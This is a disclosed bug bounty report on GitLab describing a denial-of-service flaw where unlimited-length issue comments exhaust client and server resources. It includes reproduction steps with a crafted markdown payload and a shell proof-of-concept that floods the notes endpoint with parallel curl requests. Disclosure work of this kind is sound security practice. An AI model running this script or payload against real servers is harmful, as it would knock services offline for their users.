# DoS attack via comment on Issue

## Metadata

- HackerOne Report ID: 557154
- Weakness: Uncontrolled Resource Consumption
- Program: gitlab
- Disclosed At: 2019-11-21T14:27:05.916Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

### Summary
There is no limit to the number of characters in the issue comments, which allows a DoS attack. The DoS attack affects both server-side and client-side.

**NOTE**: This bug happens on GitLab.com.

### Steps to reproduce
▼Attack for Client-side 
1. Sign in to GitLab.
2. Create a project as below:
    - Project name: test01
    - Project slug: test01
    - Visibility Level: Public
    - Initialize repository with README: Checked
3. Create a new issue for the project created in Step 2.
4. Post some comments on the Issue created in Step 3.
5. Post a comment as below:
`[a](/a/a/a/a/a/a/a/a/a/a/a/a/a/a.....(50000 times))`
6. Reload the Issue page.

Result: I received an error message "Something went wrong while fetching comments. Please try again." And I could not fetch all the comments.

Note: In Step 5, if you can not post the comment from the browser, send the HTTP request directly in some way.
Note: The string to post in step 5 is described in the attached file F481358.

▼Attack for Server-side
An attacker can exhaust server resources by continuously sending the requests generated in Step 5 of [Attack for Client-side]. This causes a denial of service to all users.

For example, you can verify it with a script as below:
```sh
#!/bin/sh
charBlock=$(head -c 50000 /dev/zero | sed -e 's/\x00/\/a/g')
payload='[a]('$charBlock')'

gitlabHost=$1
ProjectURL=$2
targetID=$3
loop=$4

curl=`cat << EOS
curl
  --insecure
  --silent
  --output /dev/null
  ${ProjectURL}/notes?target_id=${targetID}\&target_type=issue
  --header 'Host: ${gitlabHost}'
  --header 'X-CSRF-Token: [PLACEHOLDER]'
  -b '_gitlab_session=[PLACEHOLDER]'
  --data-binary 'note%5Bnoteable_type%5D=Issue&note%5Bnoteable_id%5D=3&note%5Bnote%5D=${payload}&merge_request_diff_head_sha=undefined'
EOS`

for i in `seq ${loop}`
do
    eval ${curl}&
done
```

Run the above script with the following command to see that the server's CPU is exhausted.
```
$ ./poc.sh [GitLab host] [Project URL] [target ID(※1)] [Repeat count of request]
```
※1: Get from the request generated in step 5 of [Client-side attack].
